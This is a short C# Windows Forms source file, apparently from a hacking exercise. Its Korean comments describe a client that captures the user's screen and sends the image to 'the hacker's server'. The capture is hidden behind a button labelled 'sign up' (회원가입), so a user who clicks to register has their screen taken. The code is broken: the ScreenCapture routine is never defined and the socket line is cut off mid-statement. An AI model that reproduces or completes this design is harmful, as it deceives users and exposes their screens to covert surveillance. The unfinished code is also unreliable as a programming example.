using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
/*
[입력 화면 캡처 전송 - 클라이언트]
 - 스크린을 캡춰하여 해커의 서버에 전송

#이벤트 핸들러
 - btnSave_Click(object sender, EventArgs e) : [회원가입] 버튼, 서버와 통신하며 캡처한 이미지 파일을 전송
*/
namespace mook_ScreenClien
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        //[회원가입] : 화면 캡춰된 이미지 파일을 서버에 전송
        private void btnSave_Click(object sender, EventArgs e)
        {
            if (ScreenCapture() != true)
                return;
            Socket mySocket = new Socket(AddressFamily.InterNetwork)
        }
    }
}
